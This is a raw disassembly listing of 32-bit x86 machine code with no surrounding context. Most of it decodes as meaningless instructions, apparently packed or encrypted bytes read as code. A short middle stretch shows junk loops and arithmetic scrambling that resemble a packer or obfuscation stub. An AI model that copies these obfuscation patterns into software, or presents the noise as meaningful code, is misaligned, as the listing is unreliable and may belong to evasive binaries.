  411d66:	sbb    al,0xef
  411d68:	inc    edi
  411d69:	push   ebp
  411d6a:	lods   al,BYTE PTR ds:[esi]
  411d6b:	mov    ds:0xf9a1e0e,al
  411d70:	ret    0xd2f1
  411d73:	mov    DWORD PTR ds:0x7b6d7b1a,edi
  411d79:	push   edi
  411d7a:	fnstcw WORD PTR [edx]
  411d7c:	popf   
  411d7d:	loop   0x411daf
  411d7f:	(bad)  
  411d80:	sbb    eax,0x52b05403
  411d85:	xchg   DWORD PTR [ebx-0x15],edi
  411d88:	jmp    0x411ddd
  411d8a:	adc    DWORD PTR [edi+0x6b],esi
  411d8d:	rcr    BYTE PTR ds:0x17abce81,cl
  411d93:	sbb    al,0x11
  411d95:	xchg   ebp,eax
  411d96:	ja     0x411d9e
  411d98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d99:	stos   BYTE PTR es:[edi],al
  411d9a:	adc    eax,0xed5da75b
  411d9f:	adc    BYTE PTR [ebx-0x8],cl
  411da2:	cld    
  411da3:	cmc    
  411da4:	mov    esi,0xf0bf1b9e
  411da9:	sbb    edx,esi
  411dab:	ficom  DWORD PTR [ebx-0x63b5c66b]
  411db1:	mov    al,ds:0x868beb93
  411db6:	mov    ch,0x63
  411db8:	cs dec esp
  411dba:	dec    eax
  411dbb:	add    BYTE PTR [edx-0xb],dh
  411dbe:	sbb    dl,BYTE PTR ds:0x6b19869f
  411dc4:	jge    0x411d71
  411dc6:	pop    esp
  411dc7:	jmp    0x6989ae57
  411dcc:	pop    edx
  411dcd:	(bad)  
  411dce:	dec    esp
  411dcf:	repz push es
  411dd1:	scas   eax,DWORD PTR es:[edi]
  411dd2:	ds (bad) 
  411dd5:	add    eax,0xbb20fe0b
  411dda:	dec    ebx
  411ddb:	mov    ds,WORD PTR ds:0x83fb825c
  411de1:	mov    eax,edi
  411de3:	rcl    BYTE PTR [eax+0x77f232e5],0xb6
  411dea:	cmc    
  411deb:	jmp    DWORD PTR ds:0x8b87bccb
  411df1:	add    DWORD PTR [edi-0x492db4dc],edi
  411df7:	jmp    0xb05b:0xe6c4907f
  411dfe:	in     al,0xcb
  411e00:	and    DWORD PTR [ecx+0x31],ebx
  411e03:	div    esi
  411e05:	jbe    0x411dc9
  411e07:	jbe    0x411e82
  411e09:	mov    BYTE PTR [ecx],bh
  411e0b:	clc    
  411e0c:	loop   0x411de6
  411e0e:	pop    ecx
  411e0f:	in     al,dx
  411e10:	push   cs
  411e11:	jle    0x411e69
  411e13:	add    al,ch
  411e15:	fcomip st,st(0)
  411e17:	retf   
  411e18:	push   ebp
  411e19:	sahf   
  411e1a:	adc    al,0xe9
  411e1c:	shl    BYTE PTR ds:[edi+0x39fbaabc],cl
  411e23:	push   esp
  411e24:	sbb    al,0x24
  411e26:	data16 arpl WORD PTR [edx+edx*8],sp
  411e2a:	cwde   
  411e2b:	sbb    edi,edi
  411e2d:	lahf   
  411e2e:	inc    eax
  411e2f:	sub    ecx,ecx
  411e31:	xor    DWORD PTR [edi],eax
  411e33:	fs cmp al,0x9d
  411e36:	in     eax,dx
  411e37:	cwde   
  411e38:	jmp    0x60e37f10
  411e3d:	push   ebp
  411e3e:	ins    BYTE PTR es:[edi],dx
  411e3f:	adc    eax,ecx
  411e41:	mov    ds:0xa647e6d1,eax
  411e46:	int    0x76
  411e48:	mov    ds:0x35296559,eax
  411e4d:	shr    BYTE PTR [edi+ecx*4],0xb2
  411e51:	jmp    0x905b:0x7cda8b49
  411e58:	dec    ecx
  411e59:	int    0x32
  411e5b:	inc    esp
  411e5c:	fld    TBYTE PTR [ebx-0x15]
  411e5f:	pop    esi
  411e60:	sar    BYTE PTR [ecx],cl
  411e62:	cwde   
  411e63:	jb     0x411e80
  411e65:	inc    ecx
  411e66:	sbb    eax,DWORD PTR [eax]
  411e68:	fdivr  QWORD PTR [ebx+ecx*8]
  411e6b:	sub    al,0x40
  411e6d:	hlt    
  411e6e:	repnz mov ds:0xaff54f1,al
  411e74:	adc    cl,dl
  411e76:	dec    edi
  411e77:	jmp    0x80e1c8fd
  411e7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e7d:	push   edx
  411e7e:	(bad)  
  411e7f:	xchg   esi,eax
  411e80:	xchg   BYTE PTR [eax],dh
  411e82:	out    0xde,eax
  411e84:	out    0xd1,eax
  411e86:	retf   
  411e87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e88:	push   0xfffffff5
  411e8a:	sub    BYTE PTR [edi-0x3],al
  411e8d:	sahf   
  411e8e:	in     al,dx
  411e8f:	mov    eax,ds:0xacfef79d
  411e94:	retf   0x790a
  411e97:	lea    edx,[ebp-0x1d59bf5e]
  411e9d:	jg     0x411e1f
  411e9f:	retf   0x546c
  411ea2:	retf   0xbdbc
  411ea5:	sub    ebx,esp
  411ea7:	repnz fisttp WORD PTR [ebx+0x1c42a310]
  411eae:	mov    al,ds:0xec676252
  411eb3:	sub    al,0x51
  411eb5:	fld    DWORD PTR [esi]
  411eb7:	repnz fs inc ecx
  411eba:	scas   al,BYTE PTR es:[edi]
  411ebb:	pop    es
  411ebc:	ins    BYTE PTR es:[edi],dx
  411ebd:	scas   eax,DWORD PTR es:[edi]
  411ebe:	rcl    edi,cl
  411ec0:	sbb    BYTE PTR ss:[eax+0x15],dl
  411ec4:	dec    esi
  411ec5:	jne    0x411f3f
  411ec7:	(bad)  
  411ec8:	out    0x47,eax
  411eca:	sub    edi,DWORD PTR [ecx]
  411ecc:	pop    esi
  411ecd:	loopne 0x411f1d
  411ecf:	inc    edx
  411ed0:	(bad)  
  411ed1:	push   ds
  411ed2:	cwde   
  411ed3:	ret    0x7076
  411ed6:	(bad)  
  411ed7:	push   ecx
  411ed8:	xchg   edx,eax
  411ed9:	out    0xe3,al
  411edb:	repnz dec esp
  411edd:	jb     0x411edc
  411edf:	sbb    eax,0xf3da9d31
  411ee4:	push   edi
  411ee5:	push   cs
  411ee6:	and    BYTE PTR [esi],al
  411ee8:	dec    ebp
  411eea:	push   esi
  411eeb:	push   eax
  411eec:	mov    gs,WORD PTR [edi]
  411eee:	mov    ebx,DWORD PTR [edx]
  411ef0:	adc    eax,0x554df382
  411ef5:	and    BYTE PTR [edx-0x563e347f],bl
  411efb:	popa   
  411efc:	mov    al,0x28
  411efe:	ds or  al,0x98
  411f01:	cwde   
  411f02:	sbb    al,bh
  411f04:	mov    al,ds:0x22b8d050
  411f09:	jle    0x411eba
  411f0b:	stos   DWORD PTR es:[edi],eax
  411f0c:	pop    edx
  411f0d:	ins    DWORD PTR es:[edi],dx
  411f0e:	jne    0x411eb2
  411f10:	sbb    DWORD PTR [ebp+0x57f030a4],ebx
  411f16:	out    0xa4,al
  411f18:	sub    BYTE PTR [ebx],0x60
  411f1b:	or     esi,eax
  411f1d:	test   DWORD PTR [ebx+0x13],esi
  411f20:	add    ah,BYTE PTR [ebp+0x559a859d]
  411f26:	test   ebx,ebp
  411f28:	loop   0x411eb3
  411f2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f2b:	out    dx,al
  411f2c:	dec    edx
  411f2d:	inc    ebp
  411f2e:	cwde   
  411f2f:	test   BYTE PTR [esi+0x45c74157],al
  411f35:	sub    al,0x35
  411f37:	lahf   
  411f38:	push   edi
  411f39:	outs   dx,DWORD PTR ds:[esi]
  411f3a:	fimul  WORD PTR [eax-0x13]
  411f3d:	js     0x411f40
  411f3f:	outs   dx,DWORD PTR ds:[esi]
  411f40:	fiadd  DWORD PTR [ebp+0x6d878be2]
  411f46:	pop    ecx
  411f47:	stos   DWORD PTR es:[edi],eax
  411f48:	cmp    al,0xb8
  411f4a:	jle    0x411fc4
  411f4c:	jmp    0x5d88:0x8ddc7829
  411f53:	adc    bh,BYTE PTR fs:[eax-0xa]
  411f57:	out    0x96,al
  411f59:	push   esp
  411f5a:	lds    ebx,FWORD PTR [edi]
  411f5c:	ret    0x977f
  411f5f:	scas   al,BYTE PTR es:[edi]
  411f60:	cmp    eax,0x21a6657a
  411f65:	pop    ebp
  411f66:	xor    eax,0x71cb3079
  411f6b:	pushf  
  411f6c:	add    eax,0xe7e8dd75
  411f71:	fsubr  DWORD PTR [edx]
  411f73:	ja     0x411f23
  411f75:	rcr    BYTE PTR [edx-0x5b],1
  411f78:	jle    0x411efb
  411f7a:	les    esp,FWORD PTR [ebp-0x21]
  411f7d:	pushf  
  411f7e:	or     edx,DWORD PTR [ebx-0x4b]
  411f81:	sbb    bh,dh
  411f83:	aas    
  411f84:	sbb    ebp,0x5e
  411f87:	inc    esp
  411f88:	inc    ebx
  411f89:	rol    BYTE PTR [ebx+0x34977f2a],cl
  411f8f:	(bad)  
  411f90:	fdiv   QWORD PTR [edx]
  411f92:	push   es
  411f93:	inc    ebp
  411f94:	push   edx
  411f95:	sbb    DWORD PTR [ebp+0x43],edx
  411f98:	(bad)  
  411f99:	jmp    0x411fdd
  411f9b:	not    DWORD PTR [ebx]
  411f9d:	mov    al,0x63
  411f9f:	mov    al,0x5d
  411fa1:	lock lea esi,[ebp+eax*1-0x7436d9b0]
  411fa9:	iret   
  411faa:	sub    BYTE PTR [ebx-0xc],cl
  411fad:	hlt    
  411fae:	sbb    al,0xea
  411fb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411fb1:	jbe    0x411f43
  411fb3:	das    
  411fb4:	jl     0x412017
  411fb6:	fld    QWORD PTR [esi-0x7a]
  411fb9:	rcl    DWORD PTR [ecx-0x66],cl
  411fbc:	xchg   ecx,edi
  411fbe:	xor    DWORD PTR [ebp+0x1f8ceb4b],0xb3c78ace
  411fc8:	push   eax
  411fc9:	dec    esp
  411fca:	or     ebx,DWORD PTR [ebx]
  411fcc:	loope  0x411fe7
  411fce:	push   edi
  411fcf:	fs mov bl,0x48
  411fd2:	fwait
  411fd3:	xor    al,0x3
  411fd5:	sbb    ch,BYTE PTR [eax]
  411fd7:	mov    eax,0x19e2d92d
  411fdc:	arpl   WORD PTR [ebp-0x78],dx
  411fdf:	mov    WORD PTR [edx-0x57],cs
  411fe2:	js     0x412035
  411fe4:	mov    cl,0xfb
  411fe6:	out    dx,eax
  411fe7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411fe8:	aaa    
  411fe9:	ret    
  411fea:	xor    ebx,DWORD PTR [edi+0xfe8b4f0]
  411ff0:	sbb    ebp,ecx
  411ff2:	mov    esp,0xdac23fd4
  411ff7:	std    
  411ff8:	mov    al,ds:0x81c3336e
  411ffd:	cmp    al,0x3e
  411fff:	je     0x412009
  412001:	add    al,0x59
  412003:	in     al,0x8e
  412005:	ror    BYTE PTR [esi-0x6b2b13f0],cl
  41200b:	dec    esp
  41200c:	cwde   
  41200d:	out    dx,eax
  41200e:	sub    BYTE PTR [esi+0x338b81bb],bh
  412014:	xor    al,0x1d
  412016:	in     al,0xc0
  412018:	cmp    ebx,ecx
  41201a:	inc    eax
  41201b:	or     DWORD PTR [edi+edi*2-0x22],esi
  41201f:	dec    ebx
  412020:	jno    0x41201e
  412022:	push   esp
  412023:	pop    esi
  412024:	iret   
  412025:	cwde   
  412026:	clc    
  412027:	pop    eax
  412028:	rol    bh,1
  41202a:	jl     0x41202a
  41202c:	xchg   edx,eax
  41202d:	and    eax,0xe7d4db91
  412032:	sub    bl,BYTE PTR [ecx+0x50]
  412035:	jno    0x41200d
  412037:	in     eax,dx
  412038:	test   esi,0xcd86fd02
  41203e:	adc    DWORD PTR [ecx+0x470465c3],ebx
  412044:	adc    BYTE PTR ds:0xd1dd628f,cl
  41204a:	or     dh,BYTE PTR [ebp-0x2d]
  41204d:	scas   al,BYTE PTR es:[edi]
  41204e:	jl     0x412048
  412050:	mov    ebp,0x9709a7cd
  412055:	dec    ecx
  412056:	inc    esi
  412057:	pop    ds
  412058:	sub    BYTE PTR [edx],bh
  41205a:	cld    
  41205b:	ret    0xe326
  41205e:	iret   
  41205f:	test   al,0x87
  412061:	add    al,bh
  412063:	loopne 0x412066
  412065:	leave  
  412066:	dec    edi
  412067:	fistp  QWORD PTR [ebp+edx*2+0x13]
  41206b:	icebp  
  41206c:	mov    ebx,0x7036f19e
  412071:	test   al,0xea
  412073:	sbb    eax,0xaa01705a
  412078:	adc    eax,0x5f64ae4f
  41207d:	mov    DWORD PTR [eax+0x664fa07f],esi
  412083:	icebp  
  412084:	mov    ecx,0x217c5c17
  412089:	scas   al,BYTE PTR es:[edi]
  41208a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41208b:	popf   
  41208c:	xchg   esp,eax
  41208d:	push   es
  41208e:	xchg   esp,eax
  41208f:	jno    0x412109
  412091:	jp     0x412046
  412093:	retf   0xf7ba
  412096:	pop    edi
  412097:	and    ebx,DWORD PTR [ecx]
  412099:	push   esp
  41209a:	aam    0x9a
  41209c:	dec    eax
  41209d:	les    esi,FWORD PTR [edx+ecx*1-0x1c51d7be]
  4120a4:	mov    edi,0xc7c45fb
  4120a9:	mov    eax,ds:0x140e5163
  4120ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120af:	push   edi
  4120b0:	sahf   
  4120b1:	loop   0x41205b
  4120b3:	inc    edi
  4120b4:	ins    DWORD PTR es:[edi],dx
  4120b5:	scas   al,BYTE PTR es:[edi]
  4120b6:	and    al,0x78
  4120b9:	ss in  eax,0x2c
  4120bc:	test   eax,0x6e2d31b7
  4120c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4120c2:	(bad)  
  4120c3:	push   ebx
  4120c4:	push   ss
  4120c5:	ret    
  4120c6:	(bad)  
  4120c7:	pusha  
  4120c8:	bound  edi,QWORD PTR [esi]
  4120ca:	(bad)  
  4120cc:	sar    DWORD PTR [edi-0x57],1
  4120cf:	cmc    
  4120d0:	pop    esi
  4120d1:	sbb    BYTE PTR [ecx-0x13aa5646],cl
  4120d7:	sbb    bl,BYTE PTR [ebx+0x3b517d41]
  4120dd:	sti    
  4120de:	sub    BYTE PTR [ebx],bh
  4120e0:	iret   
  4120e1:	call   0x42ad4724
  4120e6:	pop    esp
  4120e7:	scas   al,BYTE PTR es:[edi]
  4120e8:	jo     0x4120a6
  4120ea:	clc    
  4120eb:	addr16 das 
  4120ed:	inc    ecx
  4120ee:	imul   ebx,DWORD PTR [edi],0x51
  4120f1:	fnstcw WORD PTR [eax+0x3c]
  4120f4:	push   ss
  4120f5:	jbe    0x4120c7
  4120f7:	aas    
  4120f8:	imul   eax,DWORD PTR [edi],0xc0b12228
  4120fe:	retf   0x6ba1
  412101:	fsubr  st,st(4)
  412103:	mov    al,ds:0x701ad31f
  412108:	add    edx,DWORD PTR [edi]
  41210a:	imul   ebp,DWORD PTR [esi],0x32
  41210d:	sub    eax,0x71922439
  412112:	xor    al,0x9d
  412114:	mov    esi,0x3092ae36
  412119:	call   0x4ad6:0x3c69141
  412120:	pop    ds
  412121:	and    BYTE PTR [edi+edi*4+0x58625ece],0x97
  412129:	adc    al,0x56
  41212b:	shr    BYTE PTR [edi+ecx*2],cl
  41212e:	inc    ebp
  41212f:	lea    esi,[eax+0x3de81fc6]
  412135:	adc    ch,bl
  412137:	jo     0x41215a
  412139:	das    
  41213a:	in     eax,0x52
  41213c:	out    0xe5,al
  41213e:	mov    dh,0x15
  412140:	out    0x98,al
  412142:	adc    DWORD PTR [edx-0x17],ecx
  412145:	mov    cl,0x9
  412147:	(bad)  
  412148:	and    bl,dl
  41214a:	enter  0x9c81,0x22
  41214e:	retf   0x80dc
  412151:	cmc    
  412152:	add    DWORD PTR [ebx-0x3b06cbbf],0xe77ee3b0
  41215c:	pop    edx
  41215d:	aad    0xf4
  41215f:	or     ebp,DWORD PTR ds:0xd4612e9b
  412165:	xor    DWORD PTR [ecx+eax*4+0x52491ec1],eax
  41216c:	push   edi
  41216d:	cmp    eax,0x7e931ec2
  412172:	and    esi,0xf45c9415
  412178:	cwde   
  412179:	mov    ebp,0x22dbc483
  41217e:	psrlq  mm1,QWORD PTR [edx]
  412181:	out    dx,al
  412182:	out    dx,al
  412183:	mov    esi,0x7aac9a7f
  412188:	into   
  412189:	push   edi
  41218a:	or     ebx,ebx
  41218c:	pop    ecx
  41218d:	add    al,0x7f
  41218f:	fisubr WORD PTR [eax-0x7a]
  412192:	fsubr  QWORD PTR [edx+ecx*8]
  412195:	mov    esp,0x4e6e2785
  41219a:	in     al,dx
  41219b:	iret   
  41219c:	fs inc edi
  41219e:	adc    al,0x1b
  4121a0:	loope  0x412134
  4121a2:	mov    dl,0xf3
  4121a4:	jge    0x412155
  4121a6:	xlat   BYTE PTR ds:[ebx]
  4121a7:	xor    edx,DWORD PTR [ecx-0x770e9a4f]
  4121ad:	jp     0x412202
  4121af:	xchg   edi,eax
  4121b0:	sar    BYTE PTR [eax-0x4425299f],cl
  4121b6:	pop    ecx
  4121b7:	cmp    dh,BYTE PTR [ebx-0x65]
  4121ba:	mov    bh,BYTE PTR [ecx+0x36]
  4121bd:	xchg   edi,eax
  4121be:	xchg   esp,eax
  4121bf:	xchg   BYTE PTR ds:0xa50fe01e,al
  4121c5:	hlt    
  4121c6:	pop    esp
  4121c7:	outs   dx,BYTE PTR ds:[esi]
  4121c8:	pop    ebx
  4121c9:	test   DWORD PTR [edx],ecx
  4121cb:	cmp    eax,0x6c505ab0
  4121d0:	retf   0xe1a6
  4121d3:	std    
  4121d4:	pop    ss
  4121d5:	cmc    
  4121d6:	push   eax
  4121d7:	cmp    eax,0xf716b345
  4121dc:	call   0x52120864
  4121e1:	mov    bh,0x6b
  4121e3:	and    BYTE PTR [eax+0x7c],al
  4121e6:	and    al,0xa6
  4121e8:	xlat   BYTE PTR ds:[ebx]
  4121e9:	stos   DWORD PTR es:[edi],eax
  4121ea:	adc    eax,0xf59f2577
  4121ef:	mov    eax,ds:0xbd8de065
  4121f4:	jge    0x412179
  4121f6:	sbb    bh,dl
  4121f8:	push   0xfe79dd5b
  4121fd:	idiv   cl
  4121ff:	cmp    ebp,DWORD PTR [ebp+0x3b18ee]
  412205:	mov    dh,BYTE PTR ds:0x4befe684
  41220b:	jmp    0xdf27:0xd9be48c1
  412212:	sti    
  412213:	std    
  412214:	out    0x7c,al
  412216:	add    eax,0x851ecce5
  41221b:	inc    ebp
  41221c:	sbb    ebx,ebx
  41221e:	ret    
  41221f:	push   es
  412220:	mov    eax,ds:0x9c4b143d
  412225:	jecxz  0x41226b
  412227:	mov    ebp,0x2994a351
  41222c:	jg     0x4121f5
  41222e:	loopne 0x4121d3
  412230:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  412232:	cmp    DWORD PTR [ecx+0x726727d7],edx
  412238:	push   esi
  412239:	cmp    edi,DWORD PTR [ecx-0x7319f26a]
  41223f:	and    esp,DWORD PTR [edi]
  412241:	mov    DWORD PTR [esi-0x3a],0x89737035
  412248:	push   ds
  412249:	add    esp,DWORD PTR [ebp-0x6b]
  41224c:	and    eax,0xa3de495
  412251:	sub    edx,0xcdd52c7f
  412257:	mov    cs,esp
  412259:	mov    dh,0x4a
  41225b:	ret    0x2bb3
  41225e:	sub    edi,DWORD PTR [esi]
  412260:	and    eax,DWORD PTR [ecx+0x1c]
  412263:	jle    0x412209
  412265:	jnp    0x412275
  412267:	data16 mov dh,0x2b
  41226a:	add    al,0x13
  41226d:	or     al,0x17
  41226f:	push   0x4530c5f7
  412274:	jge    0x412259
  412276:	jge    0x4122e8
  412278:	mov    DWORD PTR [ecx],esp
  41227a:	mov    ds:0xdfb37d54,al
  41227f:	test   al,0xa7
  412281:	(bad)  
  412282:	push   esp
  412283:	push   esp
  412284:	pop    edi
  412285:	shl    BYTE PTR [edx],1
  412287:	dec    edx
  412288:	test   dh,bh
  41228a:	push   0x70a21034
  41228f:	mov    ?,WORD PTR [ecx-0x68772db3]
  412295:	clc    
  412296:	inc    ebp
  412297:	jp     0x3de0dc3c
  41229d:	mov    cl,BYTE PTR [edi]
  41229f:	pop    esi
  4122a0:	clc    
  4122a1:	ss mov esi,0x20c3eb98
  4122a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4122a8:	imul   edi,DWORD PTR [ecx+0x2e],0xa22d2d7c
  4122af:	push   0x81815c47
  4122b4:	jmp    0x412317
  4122b6:	(bad)  
  4122b8:	pop    ebx
  4122b9:	ret    
  4122ba:	mov    al,0xa7
  4122bc:	fcomip st,st(6)
  4122be:	lods   eax,DWORD PTR ds:[esi]
  4122bf:	sub    esi,eax
  4122c1:	mov    al,ds:0xa549cc8f
  4122c6:	and    esi,ebx
  4122c8:	(bad)  
  4122c9:	mov    gs,WORD PTR [ecx-0x6bac059b]
  4122cf:	mov    al,ds:0x806e858f
  4122d4:	push   es
  4122d5:	imul   ecx,DWORD PTR ds:0xc6144044,0x2d3a3c34
  4122df:	dec    ebx
  4122e0:	leave  
  4122e1:	inc    ecx
  4122e2:	pushf  
  4122e3:	sbb    eax,0xea5fbfcb
  4122e8:	fld    DWORD PTR [edi+eax*2+0x21d67e8]
  4122ef:	mov    eax,edi
  4122f1:	into   
  4122f2:	push   0xfde93f99
  4122f7:	sbb    ecx,DWORD PTR [edi]
  4122f9:	mov    edi,0x5ab84730
  4122fe:	mov    ch,0x8
  412300:	xchg   esp,eax
  412301:	jns    0x41236f
  412303:	inc    esp
  412304:	rcl    BYTE PTR [eax+0x31],cl
  412307:	stos   BYTE PTR es:[edi],al
  412308:	jno    0x4122d5
  41230a:	xchg   DWORD PTR [ecx-0x54ec096e],esi
  412310:	mov    dl,BYTE PTR [ecx+0x61]
  412313:	or     BYTE PTR [edx],bl
  412315:	fnstenv [ecx+0x53]
  412318:	mov    cl,0x72
  41231a:	repnz inc eax
  41231c:	pop    ss
  41231d:	sbb    al,0x52
  41231f:	ins    BYTE PTR es:[edi],dx
  412320:	inc    ebp
  412321:	adc    al,ah
  412323:	ret    0x2de7
  412326:	je     0x41232c
  412328:	xor    eax,0x6aed0ac8
  41232d:	aaa    
  41232e:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412330:	sbb    al,ah
  412332:	arpl   WORD PTR [esi-0x7e],ax
  412335:	pop    es
  412336:	jns    0x41231c
  412338:	sub    ebp,esp
  41233a:	pop    esi
  41233b:	ret    
  41233c:	cdq    
  41233d:	inc    ecx
  41233e:	pop    edi
  41233f:	retf   0x1537
  412342:	ret    
  412343:	ror    dh,1
  412345:	mov    ch,0x5c
  412347:	outs   dx,BYTE PTR ds:[esi]
  412348:	out    dx,al
  412349:	leave  
  41234a:	pop    ds
  41234b:	imul   esp,DWORD PTR [ebx-0x62171b7e],0x74
  412352:	shl    DWORD PTR [ebx+ebx*8+0x60bff1ee],1
  412359:	mov    edx,DWORD PTR [ebp+0x8]
  41235c:	and    DWORD PTR ds:0x42b21a,0x0
  412366:	jmp    0x41237a
  41236b:	xor    ebx,ebx
  41236d:	xor    ebx,DWORD PTR ds:0x42b21a
  412373:	inc    ebx
  412374:	mov    DWORD PTR ds:0x42b21a,ebx
  41237a:	cmp    DWORD PTR ds:0x42b21a,0x18
  412381:	jae    0x4123c1
  412387:	cmp    DWORD PTR ds:0x42b21a,0x4
  41238e:	jg     0x4123c1
  412394:	jmp    0x4123a2
  412399:	push   DWORD PTR [ebp-0x18]
  41239c:	call   DWORD PTR ds:0x42b316
  4123a2:	cmp    DWORD PTR ds:0x42b21a,0x3
  4123a9:	jne    0x4123bc
  4123af:	mov    ebx,DWORD PTR ds:0x42b21a
  4123b5:	inc    ebx
  4123b6:	mov    DWORD PTR ds:0x42b21a,ebx
  4123bc:	jmp    0x41236b
  4123c1:	mov    ebx,DWORD PTR [ebp-0x54]
  4123c4:	mov    DWORD PTR ds:0x42b21a,0x6966
  4123ce:	add    edx,0x64f880
  4123d4:	or     edx,ebx
  4123d6:	mov    DWORD PTR [ebp-0x54],edx
  4123d9:	mov    edx,DWORD PTR [ebp+0x8]
  4123dc:	xor    DWORD PTR ds:0x42b1b2,edx
  4123e2:	mov    ebx,DWORD PTR [ebp-0x50]
  4123e5:	and    DWORD PTR ds:0x42b226,0x42b18e
  4123ef:	add    edx,ecx
  4123f1:	sbb    DWORD PTR ds:0x42b1ee,0x42b196
  4123fb:	xor    edx,ebx
  4123fd:	mov    DWORD PTR [ebp-0x50],edx
  412400:	mov    DWORD PTR ds:0x42b226,0x2b16
  41240a:	mov    edx,DWORD PTR [ebp+0x8]
  41240d:	and    DWORD PTR ds:0x42b19e,0x0
  412417:	mov    ebx,DWORD PTR ds:0x42b19e
  41241d:	inc    ebx
  41241e:	mov    DWORD PTR ds:0x42b19e,ebx
  412424:	cmp    DWORD PTR ds:0x42b19e,0xc
  41242b:	ja     0x41246b
  412431:	jmp    0x412444
  412436:	push   DWORD PTR [ebp-0x10]
  412439:	push   0x7c16
  41243e:	call   DWORD PTR ds:0x42b31a
  412444:	cmp    DWORD PTR ds:0x42b19e,0xb
  41244b:	jne    0x41245e
  412451:	mov    ebx,DWORD PTR ds:0x42b19e
  412457:	inc    ebx
  412458:	mov    DWORD PTR ds:0x42b19e,ebx
  41245e:	cmp    DWORD PTR ds:0x42b19e,0x13
  412465:	jb     0x412417
  41246b:	mov    ebx,DWORD PTR [ebp-0x4c]
  41246e:	add    edx,edi
  412470:	and    edx,ebx
  412472:	mov    ebx,DWORD PTR ds:0x42b206
  412478:	add    DWORD PTR ds:0x42b1c6,ebx
  41247e:	mov    DWORD PTR [ebp-0x4c],edx
  412481:	add    DWORD PTR ds:0x42b19a,0x5c82
  41248b:	mov    edx,DWORD PTR [ebp+0x8]
  41248e:	mov    ebx,DWORD PTR [ebp-0x48]
  412491:	lea    edx,[ebx+edx*1+0x241fcdf]
  412498:	mov    DWORD PTR [ebp-0x48],edx
  41249b:	mov    edx,DWORD PTR [ebp+0x8]
  41249e:	mov    ebx,0xfa5e1524
  4124a3:	sub    ebx,edx
  4124a5:	add    ebx,DWORD PTR [ebp-0x44]
  4124a8:	mov    DWORD PTR [ebp-0x44],ebx
  4124ab:	mov    edx,DWORD PTR [ebp+0x8]
  4124ae:	xor    edx,eax
  4124b0:	add    edx,esi
  4124b2:	jne    0x40fdfa
  4124b8:	jmp    0x419191
  4124bd:	mov    edx,DWORD PTR [ebp-0xc]
  4124c0:	sub    edx,esi
  4124c2:	xor    edx,eax
  4124c4:	mov    DWORD PTR [ebp-0x5c],edx
  4124c7:	mov    edx,DWORD PTR [ebp-0x10]
  4124ca:	mov    ebx,DWORD PTR [ebp-0x8]
  4124cd:	xor    edx,eax
  4124cf:	xor    ebx,eax
  4124d1:	sub    edx,ebx
  4124d3:	sub    edx,esi
  4124d5:	xor    edx,eax
  4124d7:	mov    DWORD PTR [ebp-0x10],edx
  4124da:	mov    edx,DWORD PTR [ebp-0x14]
  4124dd:	mov    DWORD PTR [ebp+0x8],edx
  4124e0:	jmp    0x4148b5
  4124e5:	mov    edx,DWORD PTR [ebp+0x8]
  4124e8:	mov    ebx,DWORD PTR [ebp-0x8]
  4124eb:	xor    edx,eax
  4124ed:	xor    ebx,eax
  4124ef:	sub    edx,ebx
  4124f1:	sub    edx,esi
  4124f3:	xor    edx,eax
  4124f5:	mov    DWORD PTR [ebp+0x8],edx
  4124f8:	mov    edx,DWORD PTR [ebp+0x8]
  4124fb:	mov    ebx,DWORD PTR [ebp-0x58]
  4124fe:	add    edx,0x5708e2
  412504:	imul   edx,ebx
  412507:	mov    DWORD PTR [ebp-0x58],edx
  41250a:	mov    edx,DWORD PTR [ebp+0x8]
  41250d:	mov    ebx,DWORD PTR [ebp-0x54]
  412510:	add    edx,0x64f880
  412516:	or     edx,ebx
  412518:	mov    DWORD PTR [ebp-0x54],edx
  41251b:	mov    edx,DWORD PTR [ebp+0x8]
  41251e:	mov    ebx,DWORD PTR [ebp-0x50]
  412521:	add    edx,ecx
  412523:	xor    edx,ebx
  412525:	mov    DWORD PTR [ebp-0x50],edx
  412528:	mov    edx,DWORD PTR [ebp+0x8]
  41252b:	mov    ebx,DWORD PTR [ebp-0x4c]
  41252e:	add    edx,edi
  412530:	and    edx,ebx
  412532:	mov    DWORD PTR [ebp-0x4c],edx
  412535:	mov    edx,DWORD PTR [ebp+0x8]
  412538:	mov    ebx,DWORD PTR [ebp-0x48]
  41253b:	lea    edx,[ebx+edx*1+0x241fcdf]
  412542:	mov    DWORD PTR [ebp-0x48],edx
  412545:	mov    edx,DWORD PTR [ebp+0x8]
  412548:	mov    ebx,0xfa5e1524
  41254d:	sub    ebx,edx
  41254f:	add    ebx,DWORD PTR [ebp-0x44]
  412552:	mov    DWORD PTR [ebp-0x44],ebx
  412555:	jmp    0x4148b5
  41255a:	xlat   BYTE PTR ds:[ebx]
  41255b:	push   ss
  41255c:	xchg   BYTE PTR [ebx-0x7e],dh
  41255f:	repz xchg edx,eax
  412561:	add    BYTE PTR [eax-0x49],0xdb
  412565:	test   BYTE PTR [ecx+ebp*1],0xf3
  412569:	sar    dl,cl
  41256b:	mov    al,BYTE PTR [ebx-0x7ca1c17d]
  412571:	cmp    DWORD PTR [ecx-0x62f4ea09],0xffffffa7
  412578:	ss loope 0x412560
  41257b:	clc    
  41257c:	shr    cl,1
  41257e:	loope  0x41259d
  412580:	or     cl,cl
  412582:	mov    ebp,0x809c7e27
  412587:	mov    WORD PTR [edi+0x755ae812],fs
  41258d:	inc    eax
  41258e:	cmp    esi,ecx
  412590:	inc    esi
  412591:	or     esi,ebx
  412593:	pusha  
  412594:	dec    edi
  412595:	xchg   ebx,eax
  412596:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412597:	add    BYTE PTR [ebx+0x50],ch
  41259a:	dec    esp
  41259b:	sub    DWORD PTR [ebx+0x5c210a08],ebx
  4125a1:	sbb    DWORD PTR [ebx],ebp
